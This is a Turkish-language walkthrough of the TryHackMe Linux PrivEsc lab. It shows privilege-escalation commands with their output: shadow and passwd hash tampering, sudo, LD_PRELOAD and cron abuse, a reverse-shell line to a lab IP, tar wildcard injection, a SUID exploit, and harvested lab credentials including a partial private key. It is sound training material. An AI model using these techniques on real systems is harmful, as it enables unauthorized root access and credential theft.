# Linux Privilege Escalation (Linux Yetki Yükseltme)

<figure><img src=".gitbook/assets/_37abf240-b5ba-43ed-a656-76b994160740.jpeg" alt="" width="375"><figcaption></figcaption></figure>

Hedef bir sisteme çeşitli şekillerde sızdıktan sonra sistem üzerinde tam bir yetkiye sahip olamayabiliriz. Çeşitli yöntemlerle sahip olduğumuz yetkileri yükseltebiliriz. Yöntemlerimizi test etmek için Try Hack Me üzerinden bulunan [Linux PrivEsc](https://tryhackme.com/r/room/linuxprivesc) labından göstereceğim.

Öncelikle labda bulunan makineyi çalıştırıyoruz ve çalıştıktan sonra bize verilen SSH bilgileriyle hedef sisteme bağlanmalıyız. Hedef sisteme `10.10.94.109` Ip adresiyle ulaşacağız. SSH bağlantısı için user ve password321  ikilisi kullanıcak.

`ssh user@10.10.94.109`

### Okunabilir /etc/shadow

Linux sistemlerinde kullanıcı bilgileri /etc/passwd dosyasında, kullanıcı hashleri /etc/shadow dosyasında depolanır. Normal bir sistemde sistem yada kullanıcılar hakkında kritik bilgileri normal bir kullanıcının okuyamaması lazım.

Linux sistemimizde `/etc/shadow` dosyasının sahip olduğu izinleri görmek için şu komutu çalıştırıyoruz ve şu çıktıyı alıyoruz:

```
user@debian:~$ ls -al /etc/shadow

-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```

/etc/shadow dosyası üzerinde okuma ve yazma yetkimiz olduğunu görüyoruz. Güvenli bir sistemde bu izinlere sahip olmamız gerekiyor.

/etc/shadow dosyasında bulunan hash değerini okuyup John The Ripper yada Hashcat gibi araçlarla hash değerini kırmayı deneyebiliriz.

```
user@debian:~$ cat /etc/shadow

root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
...........................
```

Dosyayı okuduğumuzda root kullanıcısının şifre hash değerine ulaşıyoruz. `$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0` hash değerini kendi makinemizde hash.txt dosyasının içine ekliyoruz.&#x20;

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Bu işlem sonucunda hashlenmiş şifre değerine ulaşıyoruz: `password123`

Elde ettiğimiz şifre ile artık root olabiliriz.&#x20;

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption><p>Şifre kısmında elde ettiğimiz şifreyi giriyoruz "password123"</p></figcaption></figure>

Root yetkilerine sahip olduktan sonra diğer yöntemlerle yetki yükseltmek için root yetkisinden `exit` komutuyla çıkıyoruz.

### Yazılabilir /etc/shadow

/etc/shadow dosyası üzerinde okuma ve yazma yetkilerimiz olduğunu görmüştük. Her zaman elde ettiğimiz hash değerini kıramayabiliriz. Bu yüzden var olan hash değerini kendi oluşturacağımız hash değeriyle değiştirebiliriz.

Öncelikle `mkpasswd -m sha-512 <newPassword>` komutuyla yeni bir hash değeri elde edebiliriz.

Metin editörleriyle birlikte /etc/shadow dosyası açılıp root kullanıcısının sahip olduğu hash değeri değiştirilip kaydedilir. Sonrasında su root yaparak kendi oluşturduğumuz şifreyle root yetkilerine sahip olacağız.

```
root@ip-10-10-63-77:~/Desktop# mkpasswd -m sha-512 yavuz
$6$2OGh.AKPtUIfLWD$62aars53c2GpdNPeeLwB5pfqdstcsKUhZLPhobwiyXXehe2uL8NllzXtMgu2icxgFAJoD/H8YiPc1z9epn1430

// Eski /etc/shadow dosyası
user@debian:~$ more /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
................................

// Hash değerini güncelledikten sonra /etc/shadow dosyası
user@debian:~$ cat /etc/shadow
root:$6$2OGh.AKPtUIfLWD$62aars53c2GpdNPeeLwB5pfqdstcsKUhZLPhobwiyXXehe2uL8NllzXtMgu2icxgFAJoD/H8YiPc1z9epn1430:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
................................
```

### /etc/passwd

/etc/passwd dosyası kullanıcılar hakkında bilgileri barındırır. Yetkisiz bir kullanıcı bu içeriği okuyabilir ama üzerinde yazma yetkisine sahip olmaması lazım. Bizim hedef sistemimizde /etc/passwd dosyası üzerinde ne yetkilerimiz var bakalım.

```
user@debian:~$ ls -al /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
```

Dosya üzerinde yazma yetkisine sahibiz. Eski Linux sürümlerinde şifre hashleri /etc/passwd dosyalarında depolanırdı. Bazı sürümlerde hala bu durum geçerlidir.

cat komutuyla /etc/passwd dosyamızı okuyalım ve dosya yapısını görelim.

```
user@debian:~$ cat /etc/passwd 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
........................
```

root kelimesinden sonra gelen x karakteri /etc/passwd dosyasında şifre içermediğini, /etc/shadow dosyasında bu kullanıcı ile ilgili şifre olabilir anlamına geliyor. x değerini silip buraya hashlenmiş şifre değerini eklersek bizim sahip olacağız yeni root şifresi bu olacaktır.&#x20;

`mkpasswd -m sha-512 yavuzkuk55` komutuyla yeni hash değeri oluşturuluyor. /etc/passwd dosyasında bulunan x değeri kaldırılıp elde ettiğimiz hash değeri eklenmiştir.&#x20;

```
user@debian:~$ cat /etc/passwd

root:$6$PO6v6WfO$k4pUdK.o9nLWcqpalwU.oX3slTdCzfd6mwQ8LRraAUYflxWYUvNVQiQz9NWRKnKJ6bsebKIiskl6ijux2R6EC.:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
```

`su root` komutu yazdıktan sonra oluşturduğumuz şifre ile sisteme root yetkileriyle giriş yapabiliriz.

***

### sudo

Bazı sitemlerde düşük seviye kullanıcılara bazı uygulamalar üzerinde istisnai root yetkileri verilebilir. Bu root yetkileri düşük izinlere sahip olan kullanıcılara sistem bütününde root yetkisi vermeden uygulamayı root yetkilerine sahipmiş gibi yürütmesinde işe yarar.

Sistem tarafından düşük izinlere sahip kullanıcılara verilen root yetkilerini görmek için `sudo -l` komutunu kullanacağız.

```
user@debian:~$ sudo -l

Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

Yukarıda gördüğümüz uygulamaların/komutların düşük seviye kullanıcıyken bile root yetkisine sahipmişiz gibi çalıştırabiliriz.

Gördüğümüz uygulamaların/komutların bize vermiş olduğu root yetkilerini sömürüp sistem genelinde root yetkilerine sahip olmak için [GTFOBins](https://gtfobins.github.io) sitesinde bulunan yönergeleri takip edeceğiz.&#x20;

GTFOBins sitesine giderek yukarıda karşımıza çıkan less komutunu arayacağız. GTFOBins sitesinde çeşitli uygulamalar için çeşitli yetki yükseltme teknikleri bulunmaktadır. Bizim burada aradığımız şey sudo yetkisiyle yetki yükseltme. &#x20;

<figure><img src=".gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

Kırmızı kutu içerisinde yazan komutları sırasıyla komut satırında çalıştırıyoruz.

```
sh-4.1# sudo less /etc/profile
```

Bu komut sonrasında karşımıza çıkan uzun içeriğin sonuna en son komutumuzu ekliyoruz.&#x20;

```
# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).

if [ "`id -u`" -eq 0 ]; then
  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
else
  PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
fi
export PATH

if [ "$PS1" ]; then
  if [ "$BASH" ]; then
    # The file bash.bashrc already sets the default PS1.
    # PS1='\h:\w\$ '
    if [ -f /etc/bash.bashrc ]; then
      . /etc/bash.bashrc
    fi
  else
    if [ "`id -u`" -eq 0 ]; then
      PS1='# '
    else
      PS1='$ '
    fi
  fi
fi

# The default umask is now handled by pam_umask.
# See pam_umask(8) and /etc/login.defs.

if [ -d /etc/profile.d ]; then
  for i in /etc/profile.d/*.sh; do
    if [ -r $i ]; then
      . $i
    fi
// !!!!!!!!!!!!!!!!!
!/bin/sh
// !!!!!!!!!!!!!!!!!
```

En son komutumuzu ekledikten sonra enter tuşuna basıyoruz ve bizi root kullanıcı yapıyor.&#x20;

```
user@debian:~$ sudo less /etc/profile
sh-4.1# whoami
root
```

### LD\_PRELOAD

`sudo -l` komutu kullandıktan sonra bazı uygulamaların ve komutların GTFOBin sitesinden nasıl sömürüleceğini gördük ama yukarıdaki çıktımızda bulunan apache2 uygulaması sitede bulunmuyor.

Sitede bulunan yöntemlerle apache2 üzerinden yetki yükseltme yapamıyoruz. Bunun yerine farklı bir yöntem izleyeceğiz.

Öncelikle `sudo -l` çıktısına tekrardan bakıyoruz.

```
user@debian:~/tools/sudo$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

3.satırda LD\_PRELOAD ve LD\_LIBRARY\_PATH değerleini görüyoruz. Bu ifadeleri açıklamak gerekirse:

* &#x20;LD\_PRELOAD değeri bir uygulama çalıştırılmadan önce sistemde bulunan bir kütüphaneyi zorla yükler.
* LD\_LIBRARY\_PATH  uygulamanın kullandığı kütüphaneleri aramak için bakacağı ilk dizini vermemize yarar.

Sırasıyla bu konularda örnekler yapacağız.&#x20;

Öncekikle apache2 uygulamasını çalıştırırken LD\_PRELOAD seçeneğiyle kendi oluşturduğumu kütüphaneyi çalıştırmaya zorlayacağız.

Bağlandığımız sistemde `/home/user/tools/sudo` altında preload.c adında bir dosya bulunmakta.&#x20;

```
user@debian:~/tools/sudo$ cat preload.c 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

C kodunu okuduğumuzda çevre değişkeni kaldırılır, kullanıcı kimlik id değerleri değiştirilir ve /bin/bash komutu çalıştırılır. Öncelikle C kodunu derleyip kütüphane haline getirmeliyiz.&#x20;

Bunun için şu komutu kullanacağız:

```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

Bu komut sonrasında /tmp klasörü altında preload.so adında bir kütüphane dosyası oluşturuldu. apache2 uygulamamızı çalıştırken bu kütüphaneyi yüklemesini sağlamamız lazım.

```
user@debian:/tmp$ ls
backup.tar.gz  preload.so  useless
user@debian:/tmp$ sudo LD_PRELOAD=/tmp/preload.so apache2
root@debian:/tmp# whoami
root
```

Bu işlem sonunda root yetkisine sahip oluyorum.

### LD\_LIBRARY\_PATH

Yine apache üzerinden işlem yapacağız. Öncelikle apache2 uygulamasının hangi kütüphanelerini kullandığını öğrenmek için ldd komutunu kullanıyoruz.

```
user@debian:~/tools/sudo$ ldd /usr/sbin/apache2
	linux-vdso.so.1 =>  (0x00007fff509f0000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f8829cd0000)
	libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f8829aac000)
	libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f8829872000)
	libpthread.so.0 => /lib/libpthread.so.0 (0x00007f8829656000)
	libc.so.6 => /lib/libc.so.6 (0x00007f88292ea000)
	libuuid.so.1 => /lib/libuuid.so.1 (0x00007f88290e5000)
	librt.so.1 => /lib/librt.so.1 (0x00007f8828edd000)
	libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f8828ca6000)
	libdl.so.2 => /lib/libdl.so.2 (0x00007f8828aa1000)
	libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f8828879000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f882a18d000)
```

/home/user/tools/sudo/ altında bulunan library\_path.c dosyasını derleyeceğiz ve çıktı ismine apache2 uygulamasının kullandığı kütüphanelerden birinin ismini vereceğiz.

Örnek olması amacıyla derlenmiş kodun ismini `libcrypt.so.1` olarak seçeceğim.

```
user@debian:/tmp$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Sonrasında oluşturduğumuz kütüphanenin yolunu uygulama çalıştırılırken veriyoruz.&#x20;

```
user@debian:/tmp$ sudo LD_LIBRARY_PATH=/tmp apache2
apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
root@debian:/tmp# whoami
root
```

### Cron

Cron dediğimiz yapı işletim sisteminde belirlenmiş zamanlarda ve aralıklarda çalıştırılan scriptler ya da çalıştırılan uygulamalardır.

Sistemde var olan cronları görmek için `/etc/crontab` dosyasını okuyabiliriz.

```
user@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

overwrite.sh ve /usr/local/bin/compress.sh adında iki tane dosyamız. Öncelikle overwrite.sh dosyası üzerinden root yetkilerine sahip olmaya çalışalım.

Locate komutu ile dosyanın nerede olduğunu öğrenmeye çalışalım ve dosya içeriğini okuyalım.

```
user@debian:~$ locate overwrite.sh
locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 1580.2 days)
/usr/local/bin/overwrite.sh
user@debian:~$ ls -al /usr/local/bin/overwrite.sh 
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
user@debian:~$ cat /usr/local/bin/overwrite.sh 
#!/bin/bash

echo `date` > /tmp/useless
```

Dosya üzerinde yazma ve okuma izinlerine sahibiz. Dosya içeriğini değiştirip root yetkisine sahip olmaya çalışacağız.

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.188.242/4444 0>&1
```

Bu komutu yazıp kaydettikten sonra kendi sistemimizde netcat ile dinleme yapmamız gerekiyor ve 1 dakika bekledikten sonra root yetkisine sahip oluyoruz.&#x20;

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

### Cron2

Tekrardan cron dosyaların ve ayarlarına bakalım.

```
user@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

Bu yöntemimizde ise /usr/local/bin/compress.sh dosyasını manipüle edeceğiz. Yukarıdaki çıktıda görüyorsunuz ki PATH değerlerinde /home/user değeri bulunmakta. Herhangi bir dosya çalıştırılacağında PATH değerinde bulunan pathler kontrol edilir. Gördüğümüz üzere /home/user path değeri diğer değerlerden önce bulunuyor. Eğer biz /home/user altında compress.sh adında bir dosya oluştursak /usr/local/bin/compress.sh dosyasının önüne geçer ve zararlı komutları çalıştırmış oluyoruz.

Oluşturacağımız dosyanın içeriğini şu şekilde oluşturuyoruz.

```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Bundan sonra compress.sh dosyası çalışıcağı zaman /home/user altında bulunan dosya üzerinden çalıacak ve /bin/bash binaryisini /tmp/rootbash olarak kopyalıyor.

```
user@debian:~$ nano overwrite.sh
user@debian:~$ chmod +xs overwrite.sh 
user@debian:~$ ls /tmp/
backup.tar.gz  rootbash  useless
user@debian:~$ /tmp/rootbash -p
rootbash-4.1# whoami
root
```

/tmp klasörü altında oluşan rootbash dosyasını silmeyi ve root yetkisinden çıkmayı unutmayalım.

### Cron3

Sahip olduğumuz /usr/local/bin/compress.sh dosyasına dokunmadan yetki yükselttik peki bu dosya ne iş yapıyor.

```
user@debian:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

Bu komut user dizini altındaki dosyaların hepsini alıp tar ile arşivliyor (zip gibi). Bu konuma yeni bir dosya oluşturacağız ve bu dosyanın çalıştırılmasını sağlayacağız.

```
user@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
```

Bu komut ile /bin/bash binaryisini /tmp klasörüne bash isminde bir dosya olarak kopyalıyoruz. Bu komutları içere dosyayı da /home/user/ altında runme.sh adıyla oluşturuyoruz.

Bu komuttan sonra iki farklı dosya oluşturmamız gerekiyor. Dosya oluşturmak için touch komutu kullanılıyor. Oluşturacağımız dosyaların isimleri normal dosya isimlerine göre biraz farklı olacak.

<pre><code>user@debian:~$  touch /home/user/--checkpoint=1
user@debian:~$  touch /home/user/--checkpoint-action=exec=sh\ runme.sh

<strong>user@debian:~$  
</strong><strong>--checkpoint=1	myvpn.ovpn    runme.sh
</strong>--checkpoint-action=exec=sh runme.sh  overwrite.sh  tools
</code></pre>

Bu oluşturduğumuz dosyalar şu işe yarar, öncelikle `--checkpoint=1` bu parametre, bir kontrol noktasının nasıl ve ne zaman ayarlanacağını belirler `--checkpoint-action=exec=sh runme.sh` bu dosya , programı belirli bir aşamaya geldiğinde otomatik olarak bir komut çalıştırmak için kullanışlıdır.

Bizim örneğimizde 1 dosya yedekledikten sonra oluşturduğumuz zararlı yazılım olan runme.sh dosyasını çalıştıracak ve bu sayede root yetkisine sahip olacağız.

### SUID ve SGID

SUID bit ayarlandığında, bir dosya çalıştırıldığında bu dosya, çalıştıran kullanıcının kimliği yerine dosyanın sahibinin kimliği ile çalışır. Bu, kullanıcının sahip olmadığı bazı ayrıcalıklara sahip olabileceği anlamına gelir.

SGID bit ayarlandığında, bir dosya çalıştırıldığında bu dosya, çalıştıran kullanıcının grup kimliği yerine dosyanın grup kimliği ile çalışır. Bu, dosyanın sahibi değil de, dosyanın grubuna atanmış haklar üzerinden çalışmasını sağlar.

Sistemde bulunan SUID ve SGID bitlerine sahip olan uygulamaları bulmak için şu komutu yazmalıyız.

```
find / -type f -perm -u=s 2>/dev/null
// SUID biti taraması
```

```
find / -type f -perm -g=s 2>/dev/null
// SGID biti taraması
```

Karşımızı çıkan sonuçlardan bazılarında zafiyet bulunabilir. Örnek senaryomuzda /usr/sbin/exim-4.84.3 uygulamasında zafiyet bulunmakta.

```
user@debian:~$ find / -type f -perm -u=s 2>/dev/null
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
// !!!!!!!!!!!!!!!!!!
/usr/sbin/exim-4.84-3
// zafiyetli
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/bin/ping6
/bin/ping
/bin/mount
/bin/su
/bin/umount
/sbin/mount.nfs
```

Bu zafiyeti /home/user/tools/suid/exim altında bulunan cve-2016-1531.sh dosyası bizim root yetkilerine sahip olmamız için kullanacağız.

```
user@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh
[ CVE-2016-1531 local root exploit
sh-4.1# whoami
root
```

### SUID/SGID Shared Object

Sistemde çalışan uygulamalar sistemde bulunan bazı küütphaneleri kullanır. Bu kütüphanleri görmek için strace komutu kullanılır. Bizim burada yapacağımız şey uygulamanın kullandığı kütüphaneleri kontrol edip kendi kütüphanemizi ekleyebiliriz.

```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

Komutuyla sistemde bulunan hangi kütüphanelerin kullanıldığını görebiliyoruz. `/usr/local/bin/suid-so` dosyası aşşağıdaki dosyaları kullanır.&#x20;

```
user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

En altta `/home/user/.config/libcalc.so` adında bir kütüphaneden bahsediyor. Ama böyle bizim böyle bir dosyamız bulunmuyor. /home/user altında .config diye bir klasör oluşturuyoruz. /home/user/tools/suid/ altında bulunan libcalc.c dosyasını derleyip libcalc.so adıyla kaydetmemiz gerekiyor.

```
user@debian:~$ mkdir .config
user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c 
user@debian:~$ ls .config/
libcalc.so
user@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# whoami
root
```

### SUID/SGID Path

Bu sefer uygulamaların kullandığı kütüphanelerin mutlak bir yol şeklinde belirtilmemesinden dolayı programları kötüye kullanılabiliriz.

Bu örneğimiz için /usr/local/bin/suid-env uygulamasını kullanacağız.&#x20;

`string /usr/local/bin/suid-env` belirtilen dosya içindeki okunabilir karakter dizilerini ekrana yazdırmak için kullanılır.

```
user@debian:~$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```

En alt satırda bulunan service kelimesi /usr/sbin/service bu şekilde belirtilmesi gerekiyordu. Eğer biz service isminde başka bir dosya düzenlersek ve PATH değerine service dosyasının bulunduğu dizin değerini verirsek başarıyla root oluruz.

```
user@debian:~/tools/suid$ ls
exim  libcalc.c  service  service.c
user@debian:~/tools/suid$ mv service /home/user/service
user@debian:~/tools/suid$ cd 
user@debian:~$ ls
myvpn.ovpn  service  tools
user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env
root@debian:~# whoami
root
```

### History & Config Files

Bazı senaryolarda kullanıcılar komut satırında daha öncesinde şifrelerini kullanmış olabilirler. Bizim bu senaryomuzda da bu durum söz konusu.&#x20;

```
user@debian:~$ ls -al
total 68
drwxr-xr-x 6 user user 4096 Sep 12 14:30 .
drwxr-xr-x 3 root root 4096 May 15  2017 ..
-rw------- 1 user user  186 Sep 12 14:33 .bash_history
-rw-r--r-- 1 user user  220 May 12  2017 .bash_logout
-rw-r--r-- 1 user user 3235 May 14  2017 .bashrc
drwxr-xr-x 2 user user 4096 Sep 12 14:00 .config
drwxr-xr-x 2 user user 4096 May 13  2017 .irssi
drwx------ 2 user user 4096 May 15  2020 .john
-rw------- 1 user user  137 May 15  2017 .lesshst
-rw-r--r-- 1 user user  212 May 15  2017 myvpn.ovpn
-rw------- 1 user user   11 Sep 12 14:35 .nano_history
-rw-r--r-- 1 user user  725 May 13  2017 .profile
-rwxr-xr-x 1 user user 6697 Sep 12 14:30 service
drwxr-xr-x 8 user user 4096 May 15  2020 tools
-rw------- 1 user user 6334 May 15  2020 .viminfo

user@debian:~$ cat .bash_history 
ls -al
cat .bash_history 
ls -al
mysql -h somehost.local -uroot -ppassword123
exit
cd /tmp
clear
ifconfig
netstat -antp
nano myvpn.ovpn 
ls
whoami
exit
whoami
exit
whoami
clear
exi
exit
```

Ayrıca hedef sistemimizde myvpn.ovpn dosyası var ve bu dosyayı okuyabiliyoruz.&#x20;

```
user@debian:~$ cat myvpn.ovpn 
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0
```

/etcc/oopenvpn/auth.txt dosyasında büyük ihtimalle bağlanırken kullandığımız kullanıcı adı ve şifre bulunuyor.

```
user@debian:~$ cat /etc/openvpn/auth.txt 
root
password123
```

### SSH key

Sistemlere SSH anahtarlarıyla bağlanabiliriz. Bu SSH keyleri kullanıcın /home dosyaları altında gizli dosya olarak bulunur ya da / (kök) altında gizli dosya olarak bulunur.

Öncelikle sistemin / (kök) altında sahip olduğu bütün dosyaları görelim.

```
user@debian:~$ ls -al /
total 96
drwxr-xr-x 22 root root  4096 Aug 25  2019 .
drwxr-xr-x 22 root root  4096 Aug 25  2019 ..
drwxr-xr-x  2 root root  4096 Aug 25  2019 bin
drwxr-xr-x  3 root root  4096 May 12  2017 boot
drwxr-xr-x 12 root root  2820 Sep 12 13:28 dev
drwxr-xr-x 67 root root  4096 Sep 12 14:50 etc
drwxr-xr-x  3 root root  4096 May 15  2017 home
lrwxrwxrwx  1 root root    30 May 12  2017 initrd.img -> boot/initrd.img-2.6.32-5-amd64
drwxr-xr-x 12 root root 12288 May 14  2017 lib
lrwxrwxrwx  1 root root     4 May 12  2017 lib64 -> /lib
drwx------  2 root root 16384 May 12  2017 lost+found
drwxr-xr-x  3 root root  4096 May 12  2017 media
drwxr-xr-x  2 root root  4096 Jun 11  2014 mnt
drwxr-xr-x  2 root root  4096 May 12  2017 opt
dr-xr-xr-x 96 root root     0 Sep 12 13:26 proc
drwx------  5 root root  4096 May 15  2020 root
drwxr-xr-x  2 root root  4096 May 13  2017 sbin
drwxr-xr-x  2 root root  4096 Jul 21  2010 selinux
drwxr-xr-x  2 root root  4096 May 12  2017 srv
drwxr-xr-x  2 root root  4096 Aug 25  2019 .ssh
drwxr-xr-x 13 root root     0 Sep 12 13:26 sys
drwxrwxrwt  2 root root  4096 Sep 12 14:58 tmp
drwxr-xr-x 11 root root  4096 May 13  2017 usr
drwxr-xr-x 14 root root  4096 May 13  2017 var
lrwxrwxrwx  1 root root    27 May 12  2017 vmlinuz -> boot/vmlinuz-2.6.32-5-amd64
```

/ (kök) altında .ssh adında bir dosya var içinde de root\_key adında bir dosya var. Bu dosya sayesinde hedef sisteme root yetkileriyle bağlanabiliriz.&#x20;

```
user@debian:/.ssh$ cat root_key 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm
gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl
p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo
OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD
eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET
